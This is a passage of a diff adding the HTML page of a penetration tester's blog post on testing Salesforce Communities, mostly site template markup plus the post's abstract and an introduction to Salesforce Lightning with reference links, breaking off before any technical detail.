@@ -1,0 +1,5774 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" >
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Pentesting Salesforce Communities" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="This blog post shows a recent penetration test I performed for some customers’ Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article." />
+<meta property="og:description" content="This blog post shows a recent penetration test I performed for some customers’ Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article." />
+<link rel="canonical" href="http://localhost:4000/posts/salesforce-hacking/" />
+<meta property="og:url" content="http://localhost:4000/posts/salesforce-hacking/" />
+<meta property="og:site_name" content="0xbro" />
+<meta property="og:image" content="http://localhost:4000/assets/img/Salesforce-PT/thumbnail.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-02T00:00:00+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/Salesforce-PT/thumbnail.png" />
+<meta property="twitter:title" content="Pentesting Salesforce Communities" />
+<meta name="twitter:site" content="@sec_0xbro" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-02T00:00:00+01:00","datePublished":"2024-12-02T00:00:00+01:00","description":"This blog post shows a recent penetration test I performed for some customers’ Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article.","headline":"Pentesting Salesforce Communities","image":"http://localhost:4000/assets/img/Salesforce-PT/thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/salesforce-hacking/"},"url":"http://localhost:4000/posts/salesforce-hacking/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>Pentesting Salesforce Communities | 0xbro
+  </title>
+
+  <!--
+  Custom Favicons - using favicon.ico only
+-->
+
+<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">
+
+  <!-- Resource Hints -->
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
+
+  <!-- Bootstrap -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
+  
+
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  <!-- Web Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">
+
+  <!-- 3rd-party Dependencies -->
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
+
+  <!-- Scripts -->
+
+  <script src="/assets/js/dist/theme.min.js"></script>
+
+  <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js,npm/mermaid@11.12.0/dist/mermaid.min.js"></script>
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <a class="site-title d-block" href="/">0xbro</a>
+    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+
+      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
+      
+        
+          <li class="nav-item">
+            <a href="/about/" class="nav-link">
+              <i class="fa-fw fas fa-info-circle"></i>
+              <span>ABOUT</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/timeline/" class="nav-link">
+              <i class="fa-fw fas fa-timeline"></i>
+              <span>TIMELINE</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/disclosure/" class="nav-link">
+              <i class="fa-fw fas fa-handshake"></i>
+              <span>DISCLOSURE</span>
+            </a>
+          </li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+
+      <!-- Separator -->
+      <li class="nav-item nav-separator">
+        <hr class="sidebar-divider">
+      </li>
+
+      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
+      
+        
+      
+        
+      
+        
+      
+        
+          <li class="nav-item">
+            <a href="/categories/" class="nav-link">
+              <i class="fa-fw fas fa-stream"></i>
+              <span>CATEGORIES</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/projects/" class="nav-link">
+              <i class="fa-fw fas fa-code"></i>
+              <span>PROJECTS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/tags/" class="nav-link">
+              <i class="fa-fw fas fa-tags"></i>
+              <span>TAGS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/archives/" class="nav-link">
+              <i class="fa-fw fas fa-archive"></i>
+              <span>ARCHIVES</span>
+            </a>
+          </li>
+        
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+
+      
+        <a
+          href="https://github.com/0xb120"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+
+      
+        <a
+          href="https://twitter.com/sec_0xbro"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+          
+      
+
+      
+        <a
+          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
+          aria-label="linkedin"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-linkedin"></i>
+        </a>
+      
+    
+          
+        
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>Pentesting Salesforce Communities</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+
+
+
+
+
+
+<article class="px-1" data-toc="true">
+  <header>
+    <h1 data-toc-skip>Pentesting Salesforce Communities</h1>
+    
+      <p class="post-desc fw-light mb-4">This blog post shows a recent penetration test I performed for some customers' Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article.</p>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1733094000"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Dec  2, 2024
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+        
+        
+        
+
+        
+
+        <div class="mt-3 mb-3">
+          <a href="/assets/img/Salesforce-PT/thumbnail.png" class="popup img-link preview-img shimmer"><img src="/assets/img/Salesforce-PT/thumbnail.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://twitter.com/sec_0xbro">0xbro</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="3628 words"
+>
+  <em>20 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  
+    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
+      <span class="label text-truncate">Pentesting Salesforce Communities</span>
+      <button type="button" class="toc-trigger btn me-1">
+        <i class="fa-solid fa-list-ul fa-fw"></i>
+      </button>
+    </div>
+
+    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
+      <span class="label ps-2 pe-1">Contents</span>
+      <i class="fa-solid fa-angle-right fa-fw"></i>
+    </button>
+
+    <dialog id="toc-popup" class="p-0">
+      <div class="header d-flex flex-row align-items-center justify-content-between">
+        <div class="label text-truncate py-2 ms-4">Pentesting Salesforce Communities</div>
+        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
+          <i class="fas fa-close"></i>
+        </button>
+      </div>
+      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
+    </dialog>
+  
+
+  <div class="content">
+    <h2 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>As mentioned in the abstract above, this blog post is intended to be a summary of a broader penetration test activity I conducted for a client. Following a security incident, I was tasked with analysing a large number of Salesforce Communities for issues and vulnerabilities. This allowed me to familiarise myself with this technology and to learn more about the main flaws and problems of these systems.</p>
+
+<h3 id="salesforce-lightning-101"><span class="me-2">Salesforce lightning 101</span><a href="#salesforce-lightning-101" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><strong>Salesforce Lightning</strong> is a <strong>component-based framework</strong> for Salesforce app development.
+Usually, sites built with Lightning use one of the following URLs (but this is not always the case):</p>
+
+<ul>
+  <li><em>*.force.com</em></li>
+  <li><em>*.secure.force.com</em></li>
+  <li><em>*.live.siteforce.com</em></li>
+</ul>
+
+<p>For the sake of brevity, I will skip over most of the basic concepts concerning Salesforce, Salesforce Communities, and Salesforce Lighting, as there are already numerous resources on this subject online (and even AI can give you the basic answers you seek).</p>
+
+<p>Please refer to the official documentation<sup id="fnref:1"><a href="#fn:1" class="footnote" rel="footnote" role="doc-noteref">1</a></sup><sup id="fnref:2"><a href="#fn:2" class="footnote" rel="footnote" role="doc-noteref">2</a></sup> and articles below for a general introduction to the topic:</p>
+<ul>
+  <li><a href="https://www.varonis.com/blog/abusing-salesforce-communities">What are Salesforce Communities?</a> (written by Nitay Bachrach, varonis.com)</li>
+  <li><a href="https://www.enumerated.ie/index/salesforce#how:~:text=protect%20your%20data.-,What%20is%20Salesforce%20Lightning%3F,-Simply%20put%2C%20it%E2%80%99s">What is Salesforce Lightning?</a> (written by Aaron Costello, enumerated.ie)</li>
+  <li><a href="https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-1-the-essentials-ffae632a00e5">Introduction to Salesforce SAAS Applications</a> (written by Praveen Kanniah, infosecwriteups.com)</li>
+</ul>
+
+<p>However, there are some important concepts and quirks that I cannot take for granted, so we will look at them here quickly.</p>
+
+<h4 id="terminologies"><span class="me-2">Terminologies</span><a href="#terminologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+<ul>
